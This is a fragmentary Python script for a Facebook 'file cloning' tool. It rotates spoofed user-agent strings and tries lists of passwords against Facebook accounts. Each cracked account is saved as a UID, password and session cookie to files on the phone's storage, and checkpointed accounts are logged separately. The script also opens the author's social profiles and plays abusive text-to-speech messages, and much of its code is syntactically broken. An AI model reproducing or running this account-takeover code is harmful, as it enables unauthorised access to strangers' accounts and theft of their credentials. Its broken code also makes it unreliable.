...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/CenT.aep')
time.sleep(5)
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝐅𝐨𝐥𝐥𝐨𝐰 𝐦𝐲 𝗚𝗶𝘁𝗵𝘂𝗯 𝐩𝐫𝐨𝐟𝐢𝐥𝐞")
os.system('espeak -a 300 " FOLLOW MY GITHUB PROFILE"')
time.sleep(2)
os.system(f'xdg-open https://github.com/CenTsuPH')
#User-Agent#----
ua = [Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H307 [FBAN/FBIOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6407357123397343177 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0']
ua = [Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A025U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 RuxitSynthetic/1.0 v3498203973 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v10422134374 t8592351715587787526 athfa3c3975 altpub cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 RuxitSynthetic/1.0 v3498211510 t6240909548253006663 athfa3c3975 altpub cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v6307004394989372954 t7953522583624103269 ath5ee645e0 altpriv cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 RuxitSynthetic/1.0 v3498212702 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8224650317268060357 t2057609852430076409 ath2653ab72 altpriv cvcv=2 smf=0']
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4730836298461966349 t2968072354359231350 ath5ee645e0 altpriv cvcv=2 smf=0',]
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v10422134374 t8592351715587787526 athfa3c3975 altpub cvcv=2 smf=0',]
ua = [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 RuxitSynthetic/1.0 v1800029219 t3250653269130787595 athfa3c3975 altpub cvcv=2 smf=0',]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 RuxitSynthetic/1.0 v1770088481955336937 t1471639390917279598 athe94ac249 altpriv cvcv=2 smf=0",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 RuxitSynthetic/1.0 v4883627762 t7871929063389756869 athfa3c3975 altpub cvcv=2 smf=0",]
ugen2=[]
ugen=[]
cokbrut=[]
...
os.system('espeak -a 300 " FUCK, YOU, BITCH,  YOUR, NOT, WELCOME,"')
pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      time.sleep(0.2)
      os.system('espeak -a 300 " WELCOME, TO. CENT, FILE CLONING TOOLS"')
      msg = str(os.geteuid())
      time.sleep(0.5)
      menu()
    else:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/CENTM1•cp.txt', 'a').write( uid+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                open('/sdcard/CENTM1•ok.txt').write( uid+' | '+pw+' | '+kuki+'\n')
                akun.append(idf+' • '+pw)
                break
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " oh shit Cp ID"')
                open('/sdcard/CENT/M2•cp.txt').write( uid+' | '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                open('/sdcard/CENT/M2•ok.txt').write( uid+' | '+pw+' | '+kuki+'\n')
                akun.append(idf+' • '+pw)
                break
